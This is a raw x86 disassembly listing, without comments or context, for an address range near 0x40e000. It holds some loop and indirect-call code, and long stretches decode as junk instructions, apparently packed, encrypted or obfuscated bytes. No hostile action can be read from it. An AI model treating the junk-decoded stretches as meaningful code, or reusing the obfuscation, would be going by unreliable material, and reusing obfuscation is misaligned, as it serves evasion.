  40e23d:	shl    eax,cl
  40e23f:	mov    edi,0x843bebb3
  40e244:	add    edi,DWORD PTR [ebx-0x307c56a0]
  40e24a:	sub    eax,0xaed58085
  40e24f:	xor    eax,DWORD PTR [esp+esi*2-0x3d145e8a]
  40e256:	fistp  DWORD PTR [edx-0x2ece89ba]
  40e25c:	dec    esi
  40e25d:	xor    al,0x82
  40e25f:	fidiv  DWORD PTR [ebx+esi*2]
  40e262:	stos   BYTE PTR es:[edi],al
  40e263:	cmpxchg8b QWORD PTR [ebp-0x52ba239f]
  40e26a:	sub    BYTE PTR [eax],0xd9
  40e26d:	in     al,dx
  40e26e:	aad    0xd5
  40e270:	fwait
  40e271:	mov    cl,0x43
  40e273:	xor    eax,0xa3f736de
  40e278:	jb     0x40e203
  40e27a:	add    DWORD PTR [ebp+0x2581fc45],ecx
  40e280:	std    
  40e281:	cld    
  40e282:	inc    edx
  40e283:	add    BYTE PTR [eax],al
  40e285:	add    BYTE PTR [eax],al
  40e287:	add    BYTE PTR [ebx+0x42fcfd0d],cl
  40e28d:	add    BYTE PTR [ecx-0x77],al
  40e290:	or     eax,0x42fcfd
  40e295:	cmp    DWORD PTR ds:0x42fcfd,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e563
  40e2b0:	cmp    DWORD PTR ds:0x42fcfd,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fcfd
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fcfd,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fcfd,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fd6e,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fd6e,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fd6e,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fd01
  40e315:	call   DWORD PTR ds:0x42e477
  40e31b:	cmp    DWORD PTR ds:0x42fd6e,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e794
  40e340:	mov    ecx,DWORD PTR ds:0x42e79c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fd72,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	fstp   QWORD PTR [eax-0x5bc4f812]
  40e37c:	jo     0x40e3ee
  40e37e:	ret    
  40e37f:	jg     0x40e3f1
  40e381:	jo     0x40e3ce
  40e383:	das    
  40e384:	pop    ebp
  40e385:	out    dx,eax
  40e386:	push   0x77a99a3f
  40e38b:	shl    dh,1
  40e38d:	sub    BYTE PTR [eax-0x18],dl
  40e390:	pop    esi
  40e391:	int3   
  40e392:	inc    ebx
  40e393:	cmp    BYTE PTR es:[ebx+0x2f36b9fc],dl
  40e39a:	mov    bh,0xa7
  40e39c:	jle    0x40e3ab
  40e39e:	out    dx,eax
  40e39f:	pop    esi
  40e3a0:	xor    DWORD PTR ds:0xcc5440e8,eax
  40e3a6:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40e3a8:	cmp    al,0x46
  40e3aa:	movd   DWORD PTR ds:0x13cddf13,mm2
  40e3b1:	xchg   esp,eax
  40e3b2:	dec    ebp
  40e3b3:	xor    ebp,edx
  40e3b5:	cmp    eax,0xfab07f57
  40e3ba:	arpl   WORD PTR [ebx],dx
  40e3bc:	ss retf 0xb12f
  40e3c0:	pusha  
  40e3c1:	mov    ah,BYTE PTR [edi-0x2c65525d]
  40e3c7:	fisttp DWORD PTR [ebx]
  40e3c9:	cdq    
  40e3ca:	mov    DWORD PTR [edx-0x7029a5f3],edi
  40e3d0:	ret    
  40e3d1:	push   eax
  40e3d2:	lock or al,0x3c
  40e3d5:	fcmovbe st,st(5)
  40e3d7:	jl     0x40e414
  40e3d9:	scas   eax,DWORD PTR es:[edi]
  40e3da:	push   ebp
  40e3db:	inc    esi
  40e3dc:	jp     0x40e371
  40e3de:	mov    DWORD PTR [eax-0x2c],0xaf17059c
  40e3e5:	lods   al,BYTE PTR ds:[esi]
  40e3e6:	mov    eax,0x62dd9ef5
  40e3eb:	mov    dh,0x3e
  40e3ed:	or     al,0x65
  40e3ef:	mov    ds:0x2cdf086f,eax
  40e3f4:	cs cwde 
  40e3f6:	lock mov al,0xf7
  40e3f9:	xchg   esi,eax
  40e3fa:	jmp    0x8c65:0xf17d972f
  40e401:	pop    ebx
  40e402:	js     0x40e3ef
  40e404:	pop    esp
  40e405:	stc    
  40e406:	mov    al,BYTE PTR [esi]
  40e408:	pop    ss
  40e409:	or     al,0xe8
  40e40b:	dec    edi
  40e40c:	into   
  40e40d:	fs jns 0x40e3bf
  40e410:	call   0xd246ba6a
  40e415:	ret    
  40e416:	mov    ebx,0xaf7aeb8e
  40e41b:	push   esi
  40e41c:	push   esi
  40e41d:	aaa    
  40e41e:	lahf   
  40e41f:	fs pop eax
  40e421:	ds mov al,0x97
  40e424:	stos   DWORD PTR es:[edi],eax
  40e425:	mov    ah,0xd9
  40e427:	test   al,0x45
  40e429:	add    al,0x36
  40e42b:	or     ah,BYTE PTR [eax]
  40e42d:	sar    dh,cl
  40e42f:	sbb    edx,edi
  40e431:	or     DWORD PTR [edi-0x47a9c4b],0x8067a65d
  40e43b:	xlat   BYTE PTR ds:[ebx]
  40e43c:	in     eax,0x51
  40e43e:	cld    
  40e43f:	rol    esi,0x8e
  40e442:	adc    al,0xa7
  40e444:	xchg   ecx,eax
  40e445:	popa   
  40e446:	outs   dx,DWORD PTR ds:[esi]
  40e447:	sub    BYTE PTR [ebx+eax*2+0x4f],ch
  40e44b:	ins    BYTE PTR es:[edi],dx
  40e44c:	rol    DWORD PTR [ebx],1
  40e44e:	imul   ecx,DWORD PTR [ecx],0xffffffd6
  40e451:	and    eax,0x1c016220
  40e456:	ror    BYTE PTR [edi-0x79],0xbc
  40e45a:	pop    esp
  40e45b:	xchg   ecx,eax
  40e45c:	in     al,dx
  40e45d:	dec    esp
  40e45e:	pop    edi
  40e45f:	bound  esi,QWORD PTR [eax-0x279827b0]
  40e465:	je     0x40e447
  40e467:	in     al,dx
  40e468:	imul   al
  40e46a:	and    DWORD PTR [ebp-0x46],edi
  40e46d:	add    BYTE PTR [ebp+0x67cf3212],dl
  40e473:	or     cl,BYTE PTR [ebx]
  40e475:	push   ss
  40e476:	ins    BYTE PTR es:[edi],dx
  40e477:	out    0xa8,eax
  40e479:	das    
  40e47a:	jnp    0x40e41e
  40e47c:	iret   
  40e47d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e47e:	and    al,0x74
  40e480:	ds test al,0xb4
  40e483:	xor    edx,esi
  40e485:	outs   dx,BYTE PTR ds:[esi]
  40e486:	gs pop esp
  40e488:	lahf   
  40e489:	out    0x68,al
  40e48b:	dec    ecx
  40e48c:	scas   eax,DWORD PTR es:[edi]
  40e48d:	sub    DWORD PTR [edx],ecx
  40e48f:	popa   
  40e490:	xlat   BYTE PTR ds:[ebx]
  40e491:	and    eax,0x55e3269b
  40e496:	mov    bh,0x53
  40e498:	int    0xfc
  40e49a:	mov    ch,0xa5
  40e49c:	push   esp
  40e49d:	int    0x94
  40e49f:	fwait
  40e4a0:	cmc    
  40e4a1:	push   edi
  40e4a2:	pop    es
  40e4a3:	test   ch,bl
  40e4a5:	adc    al,0x8a
  40e4a7:	sbb    cl,BYTE PTR [eax+0x7]
  40e4aa:	cli    
  40e4ab:	lods   al,BYTE PTR ds:[esi]
  40e4ad:	repnz xor BYTE PTR [edi-0x2de63adf],bl
  40e4b4:	cmp    DWORD PTR [ebx+ecx*1+0x3c796f5f],eax
  40e4bb:	bnd jmp 0x40e480
  40e4be:	adc    eax,0xec522346
  40e4c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4c4:	xor    ebp,DWORD PTR [edi]
  40e4c6:	dec    ecx
  40e4c7:	out    0x4c,al
  40e4c9:	std    
  40e4ca:	sbb    BYTE PTR [edx],0xac
  40e4cd:	pop    eax
  40e4ce:	inc    ecx
  40e4cf:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40e4d6:	and    ebx,0x399a
  40e4dc:	lea    eax,[ebp-0x18]
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0x76ac740f
  40e4f5:	sbb    BYTE PTR ds:0x7070a38e,ah
  40e4fb:	ret    
  40e4fc:	jg     0x40e56e
  40e4fe:	jo     0x40e575
  40e500:	lock jne 0x40e4cd
  40e503:	(bad)  
  40e504:	outs   dx,DWORD PTR ds:[esi]
  40e505:	sbb    dl,dh
  40e507:	sbb    ebp,DWORD PTR [eax-0x1e]
  40e50a:	jb     0x40e4f5
  40e50c:	mov    esp,0xbbb6b3d5
  40e511:	jl     0x40e53e
  40e513:	cmc    
  40e514:	inc    ecx
  40e515:	lods   al,BYTE PTR ds:[esi]
  40e516:	dec    esp
  40e517:	int3   
  40e518:	xor    DWORD PTR [esi],ebp
  40e51a:	mov    edi,0xf727ce1b
  40e51f:	leave  
  40e520:	shr    BYTE PTR [edi+0x43],0x1
  40e524:	mov    esi,0x6dcf22e5
  40e529:	inc    ebp
  40e52a:	jmp    0x6c1e:0x9a7564ca
  40e531:	in     al,0x44
  40e533:	fst    DWORD PTR [ebp+eax*8+0x4d]
  40e537:	push   edx
  40e538:	dec    edx
  40e539:	sub    al,0x6
  40e53b:	mov    ah,0x91
  40e53d:	push   cs
  40e53e:	or     dh,ah
  40e540:	(bad)  
  40e541:	repz adc eax,0xf19cffe2
  40e547:	daa    
  40e548:	and    eax,0x7e76bd09
  40e54d:	cdq    
  40e54e:	mov    ds:0xd0f639bf,al
  40e553:	pop    es
  40e554:	sbb    BYTE PTR [ecx-0x6c27fca8],0xd7
  40e55b:	daa    
  40e55c:	xor    bh,0x12
  40e55f:	loope  0x40e563
  40e561:	push   0x9e33139c
  40e566:	jle    0x40e55d
  40e568:	jae    0x40e547
  40e56a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e56b:	push   edi
  40e56c:	jmp    0x40e50f
  40e56e:	rcr    DWORD PTR [edi+0x16],1
  40e571:	mov    BYTE PTR [edi],bh
  40e573:	add    DWORD PTR [edi+0x2049c836],eax
  40e579:	ret    
  40e57a:	adc    edi,DWORD PTR [eax]
  40e57c:	aad    0xf1
  40e57e:	xchg   edi,eax
  40e57f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e580:	adc    ecx,DWORD PTR [ebp+0x2a]
  40e583:	jmp    0xd9e0:0x868c0c5a
  40e58a:	in     eax,dx
  40e58b:	sbb    eax,0xc0cb22b4
  40e590:	imul   esi,DWORD PTR [edi-0x29],0x34
  40e594:	dec    esi
  40e595:	mov    eax,esi
  40e597:	mov    ecx,0x4fb1e182
  40e59c:	cmp    BYTE PTR [edi+0x1e],ah
  40e59f:	sbb    bl,BYTE PTR [ebx]
  40e5a1:	ja     0x40e5d6
  40e5a3:	or     edx,DWORD PTR [edx]
  40e5a5:	out    dx,al
  40e5a6:	inc    eax
  40e5a7:	push   0xffffffe5
  40e5a9:	in     al,0xf9
  40e5ab:	and    al,0x16
  40e5ad:	idiv   DWORD PTR [esi]
  40e5af:	(bad)  
  40e5b0:	jb     0x40e617
  40e5b2:	mov    ebx,0x9af379ea
  40e5b7:	loopne 0x40e58d
  40e5b9:	mov    ds:0x42a7c6a7,al
  40e5be:	xor    bh,BYTE PTR [ebx+0x79]
  40e5c1:	lahf   
  40e5c2:	mov    al,ds:0xd160b061
  40e5c7:	mov    ebp,0x9541befd
  40e5cc:	jmp    0x40e5c1
  40e5ce:	sbb    BYTE PTR [ebx+0x3e],dl
  40e5d1:	fistp  QWORD PTR [esi+0x78812d47]
  40e5d7:	pop    ebp
  40e5d8:	imul   BYTE PTR [ecx]
  40e5da:	or     BYTE PTR [eax],bl
  40e5dc:	and    BYTE PTR [ebp-0x1a],bh
  40e5df:	xor    eax,0x6e5c5a9d
  40e5e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5e5:	jne    0x40e640
  40e5e7:	ficom  DWORD PTR [ebx]
  40e5e9:	lods   al,BYTE PTR ds:[esi]
  40e5ea:	imul   ecx,ecx,0xffb615ce
  40e5f0:	pop    ecx
  40e5f1:	xchg   esi,eax
  40e5f2:	jne    0x40e672
  40e5f4:	inc    ecx
  40e5f5:	pop    es
  40e5f6:	dec    esi
  40e5f7:	dec    edx
  40e5f8:	jae    0x40e64a
  40e5fa:	mov    esi,0x88936958
  40e5ff:	ret    
  40e600:	pop    edx
  40e601:	out    0x53,eax
  40e603:	scas   al,BYTE PTR es:[edi]
  40e604:	xchg   ebp,eax
  40e605:	fidiv  WORD PTR [ebp+0x5b2eecef]
  40e60b:	add    al,dh
  40e60d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e60e:	jge    0x40e681
  40e610:	xchg   ecx,eax
  40e611:	xlat   BYTE PTR ds:[ebx]
  40e612:	pop    ds
  40e613:	fsub   DWORD PTR [eax]
  40e615:	or     DWORD PTR [edi-0x73aa2327],edi
  40e61b:	dec    ebx
  40e61c:	outs   dx,BYTE PTR ds:[esi]
  40e61d:	fyl2x  
  40e61f:	cmp    bh,ah
  40e621:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e622:	out    dx,eax
  40e623:	dec    edi
  40e624:	cmp    al,0x43
  40e626:	cmp    ebx,DWORD PTR [ebx+0x3c]
  40e629:	stos   BYTE PTR es:[edi],al
  40e62a:	imul   esi,DWORD PTR [ecx],0xf41e9ac7
  40e630:	pop    edx
  40e631:	mov    ebx,0xa7f43bbd
  40e636:	(bad)  
  40e637:	jmp    0x3f5f:0x85a82320
  40e63e:	xchg   edi,eax
  40e63f:	cmc    
  40e640:	cmp    dl,ah
  40e642:	or     eax,0xfc5e8f33
  40e647:	aaa    
  40e648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e649:	push   ds
  40e64a:	popa   
  40e64b:	xchg   edx,eax
  40e64c:	mov    eax,DWORD PTR [ebp-0x18]
  40e64f:	and    DWORD PTR ds:0x42fd7a,0x0
  40e659:	jmp    0x40e66b
  40e65e:	mov    ebx,DWORD PTR ds:0x42fd7a
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fd7a,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fd7a,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fd7a,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e47b
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e11c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fd01,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fcd9,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	fld    QWORD PTR [ecx-0x5dae5f0d]
  40e6e0:	jo     0x40e752
  40e6e2:	ret    
  40e6e3:	jg     0x40e755
  40e6e5:	jo     0x40e714
  40e6e7:	nop
  40e6e8:	ds pusha 
  40e6ea:	mov    dl,0x5d
  40e6ec:	lds    ebx,FWORD PTR [ecx+edi*1]
  40e6ef:	and    esp,DWORD PTR [edi+ecx*2-0x6d77e4fc]
  40e6f6:	pop    edi
  40e6f7:	pslld  mm7,QWORD PTR [ecx-0x1d61e0ce]
  40e6fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6ff:	mov    al,ds:0x4fcb48a1
  40e704:	cwde   
  40e705:	xchg   edi,eax
  40e706:	mov    bh,dh
  40e708:	and    esi,DWORD PTR [ebx]
  40e70a:	jmp    0x1484:0x8b9878f6
  40e711:	(bad)  
  40e712:	fld    DWORD PTR [ebp+0x2297a80d]
  40e718:	in     eax,dx
  40e719:	xchg   ecx,eax
  40e71a:	pushf  
  40e71b:	jmp    0x40e6ce
  40e71d:	add    eax,0xbb0f14cc
  40e722:	(bad)  
  40e723:	shl    DWORD PTR [esi+0x6ea9e1d9],1
  40e729:	pop    edi
  40e72a:	neg    DWORD PTR [edx+0x177d3faf]
  40e730:	jns    0x40e744
  40e732:	sbb    ah,BYTE PTR ds:0xb4f0b1f4
  40e738:	xor    al,0xad
  40e73a:	imul   edi,esp,0xd1e011f3
  40e740:	pusha  
  40e741:	xchg   edi,eax
  40e742:	and    bh,BYTE PTR [eax]
  40e744:	aam    0x3a
  40e746:	sti    
  40e747:	adc    al,0xe
  40e749:	in     eax,0xfc
  40e74b:	scas   al,BYTE PTR es:[edi]
  40e74c:	pop    ebp
  40e74d:	lods   al,BYTE PTR ds:[esi]
  40e74e:	mov    ?,WORD PTR [edx+0x1ea0b4fe]
  40e754:	iret   
  40e755:	mov    edi,0x3d443601
  40e75a:	dec    esi
  40e75b:	cdq    
  40e75c:	cs xchg ecx,eax
  40e75e:	jnp    0x40e7b8
  40e760:	mov    bh,0x80
  40e762:	and    eax,0x7b92c659
  40e767:	jp     0x40e777
  40e769:	retf   
  40e76a:	iret   
  40e76b:	cs mov bh,0xaa
  40e76e:	jp     0x40e783
  40e770:	or     eax,DWORD PTR [eax+eax*4]
  40e773:	sub    al,0x40
  40e775:	pop    ebp
  40e776:	inc    esp
  40e777:	cdq    
  40e778:	aam    0xf
  40e77a:	ret    0x3c84
  40e77d:	imul   BYTE PTR [esp+ecx*2]
  40e780:	shl    DWORD PTR [esi],cl
  40e782:	or     al,0xd6
  40e784:	cmp    esi,DWORD PTR [ebx-0x5cc6760b]
  40e78a:	or     DWORD PTR [ebp-0x6eb53313],edx
  40e790:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e791:	cld    
  40e792:	jl     0x40e764
  40e794:	jecxz  0x40e730
  40e796:	add    BYTE PTR [esi+eax*4],ch
  40e799:	cmp    BYTE PTR [edi+0x68ac51f],bl
  40e79f:	sub    al,0x80
  40e7a1:	stos   BYTE PTR es:[edi],al
  40e7a2:	(bad)  
  40e7a3:	mov    ah,0xac
  40e7a5:	dec    ebx
  40e7a6:	out    dx,al
  40e7a7:	mov    cl,0x0
  40e7a9:	sbb    edi,DWORD PTR [edx]
  40e7ab:	sbb    BYTE PTR ds:0x6e5ba866,al
  40e7b1:	cmc    
  40e7b2:	sub    BYTE PTR [edx+ebx*1+0x38a76659],ah
  40e7b9:	popa   
  40e7ba:	push   eax
  40e7bb:	inc    ebp
  40e7bc:	or     BYTE PTR [edi+0x235c1f37],ch
  40e7c2:	test   DWORD PTR [ecx+0x23ac4bf1],ebp
  40e7c8:	jg     0x40e845
  40e7ca:	sahf   
  40e7cb:	imul   eax,DWORD PTR [ebp+0x14],0x561892fc
  40e7d2:	cmp    ch,BYTE PTR [eax]
  40e7d4:	jnp    0x40e82e
  40e7d6:	ret    0x478a
  40e7d9:	xlat   BYTE PTR ds:[ebx]
  40e7da:	or     eax,0x6d386b78
  40e7df:	xchg   esp,eax
  40e7e0:	sbb    eax,0xb3f88d41
  40e7e5:	add    eax,0xd313e33c
  40e7ea:	lds    ecx,FWORD PTR [edi-0x13]
  40e7ed:	aaa    
  40e7ee:	lods   eax,DWORD PTR ds:[esi]
  40e7ef:	cmc    
  40e7f0:	inc    esi
  40e7f1:	jmp    0x40e82c
  40e7f3:	aas    
  40e7f4:	jnp    0x40e858
  40e7f6:	mov    ebp,0xb16c689d
  40e7fb:	adc    al,0xbe
  40e7fd:	jnp    0x40e806
  40e7ff:	mov    ss,WORD PTR [edx-0x7b986bba]
  40e805:	arpl   WORD PTR [ebx],sp
  40e807:	bound  ebx,QWORD PTR [eax-0x1d]
  40e80a:	shr    BYTE PTR [ebp+0xd],cl
  40e80d:	inc    ebp
  40e80e:	lods   eax,DWORD PTR ds:[esi]
  40e80f:	jo     0x40e7c8
  40e811:	jnp    0x40e7b5
  40e813:	fdivr  DWORD PTR [esi-0x29]
  40e816:	adc    ah,BYTE PTR [eax+0x13b27c96]
  40e81c:	mov    ds:0x635b4b15,eax
  40e821:	repnz mov WORD PTR [ebp-0x35],ds
  40e825:	inc    esi
  40e826:	out    0xb5,eax
  40e828:	pushf  
  40e829:	jmp    0x40e85d
  40e82b:	cmp    BYTE PTR [edi-0x38],0x11
  40e82f:	ds stc 
  40e831:	das    
  40e832:	xor    al,0x8b
  40e834:	add    BYTE PTR [ecx+0x42fce915],al
  40e83a:	add    BYTE PTR [edi+0x50],ah
  40e83d:	add    BYTE PTR [eax],al
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fd0d,0x42fd7e
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fce1
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e11c,0x42e6ef
  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e70b,0x57ad
  40e885:	add    eax,edi
  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fcd1,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fcd1
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fcd1,0x11
  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fcd1,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e1e7
  40e8ca:	call   DWORD PTR ds:0x42e47f
  40e8d0:	cmp    DWORD PTR ds:0x42fcd1,0x7
  40e8d7:	jne    0x40e8ec
  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fcd1
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fd8a
  40e8f8:	adc    DWORD PTR ds:0x42e6ff,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e6f7,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e6fb,0x42e6ef
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fd01
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fd0d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
  40e92e:	mov    DWORD PTR ds:0x42e70b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	cmp    DWORD PTR ss:[ecx],ebx
  40e94c:	pop    esi
  40e94d:	and    al,0xa0
  40e94f:	jo     0x40e9c1
  40e951:	ret    
  40e952:	jg     0x40e9c4
  40e954:	jo     0x40e8db
  40e956:	fwait
  40e957:	push   cs
  40e958:	dec    DWORD PTR [eax+0x45]
  40e95b:	xchg   ecx,eax
  40e95c:	int3   
  40e95d:	add    ebx,DWORD PTR [eax]
  40e95f:	(bad)  [eax]
  40e961:	pop    edi
  40e962:	pop    edi
  40e963:	cmp    al,0x81
  40e965:	and    al,0xcb
  40e967:	and    eax,0x8d79ff09
  40e96c:	push   edi
  40e96d:	jne    0x40e9e2
  40e96f:	mov    dh,0xe1
  40e971:	adc    al,0x3c
  40e973:	mov    ah,0x3c
  40e975:	push   esp
  40e976:	cli    
  40e977:	or     al,0x3e
  40e979:	jne    0x40e9f7
  40e97b:	push   0x1c319041
  40e980:	rol    DWORD PTR [esi-0x4f519d0e],0xf6
  40e987:	or     al,0x3e
  40e989:	popa   
  40e98a:	xchg   DWORD PTR [edi+ecx*8-0x18],ecx
  40e98e:	shl    DWORD PTR [edi],0x83
  40e991:	retf   
  40e992:	add    DWORD PTR [di],0xf5fea2d8
  40e999:	sar    BYTE PTR [ecx-0x57],0x72
  40e99d:	jno    0x40e9aa
  40e99f:	cmp    eax,0xa8ed12d5
  40e9a4:	push   es
  40e9a5:	mov    ebp,0x804997a4
  40e9aa:	es sbb al,0x43
  40e9ad:	stos   DWORD PTR es:[edi],eax
  40e9ae:	pop    edx
  40e9af:	cwde   
  40e9b0:	lods   al,BYTE PTR ds:[esi]
  40e9b1:	add    BYTE PTR [esi+0x59],bh
  40e9b4:	fadd   QWORD PTR [edx+0x48]
  40e9b7:	mov    edi,0x6f488e2c
  40e9bc:	shl    esi,1
  40e9be:	push   eax
  40e9bf:	sbb    DWORD PTR [esp+eiz*2+0xe6272b4],esp
  40e9c6:	xchg   cl,bl
  40e9c8:	dec    esi
  40e9c9:	es xchg edx,eax
  40e9cb:	sub    eax,0x9efc6e41
  40e9d0:	(bad)  
  40e9d1:	sti    
  40e9d2:	mov    BYTE PTR [bx+si-0x6a8e],0x92
  40e9d8:	pop    ebx
  40e9d9:	imul   esi,DWORD PTR [esi],0x11eb234b
  40e9df:	add    eax,0x8e1255eb
  40e9e4:	cmp    bl,BYTE PTR [esi-0x6709eef7]
  40e9ea:	fnsave [eax+0x5d85d87c]
  40e9f0:	or     BYTE PTR [ecx+edi*2],ah
  40e9f3:	sti    
  40e9f4:	mov    ebp,0x4d1fdf53
  40e9f9:	dec    esp
  40e9fa:	jp     0x40ea19
  40e9fc:	call   0x2e13:0x514e4eb2
  40ea03:	(bad)  
  40ea04:	push   ecx
  40ea06:	sub    eax,0x9a5754cc
  40ea0b:	jmp    0x40ea15
  40ea0d:	jl     0x40e9d6
  40ea0f:	sbb    eax,0x4b19c236
  40ea14:	adc    ebx,DWORD PTR [eax+0x4e819c86]
  40ea1a:	mov    eax,0x81a094ca
  40ea1f:	ret    
  40ea20:	int    0x1d
  40ea22:	not    BYTE PTR [edx+0x38]
  40ea25:	dec    edi
  40ea26:	imul   eax,DWORD PTR [esi+0x58],0xffffffb6
  40ea2a:	mov    WORD PTR [edx],?
  40ea2c:	sbb    al,0x46
  40ea2e:	mov    edx,edi
  40ea30:	lahf   
  40ea31:	push   ecx
  40ea32:	repz lea eax,[esi-0x5e766c6e]
  40ea39:	iret   
  40ea3a:	mov    ecx,0x4c8119b9
  40ea3f:	mov    ds:0x344e1b51,al
  40ea44:	addr16 push 0x52
  40ea47:	call   FWORD PTR [edx-0x5b]
  40ea4a:	sub    eax,DWORD PTR [ebx-0x30]
  40ea4d:	mov    ch,0x45
  40ea4f:	sub    eax,0xfe878188
  40ea54:	loop   0x40ea26
  40ea56:	mov    BYTE PTR [esi+0x52d3acb6],dh
  40ea5c:	or     al,0xa6
  40ea5e:	repnz loop 0x40ea8d
  40ea61:	mov    esi,0x5aedd77
  40ea66:	xor    al,0x5f
  40ea68:	out    dx,al
  40ea69:	add    al,0x66
  40ea6b:	jmp    0x2ab1:0x3517b4ca
  40ea72:	xchg   ebp,eax
  40ea73:	add    eax,DWORD PTR [esi+0x33234a4]
  40ea79:	mov    ah,BYTE PTR [ebp+0x61]
  40ea7c:	cdq    
  40ea7d:	pop    ecx
  40ea7e:	dec    edi
  40ea7f:	sub    DWORD PTR [ecx-0x48],esi
  40ea82:	jmp    0x40eaea
  40ea84:	pop    es
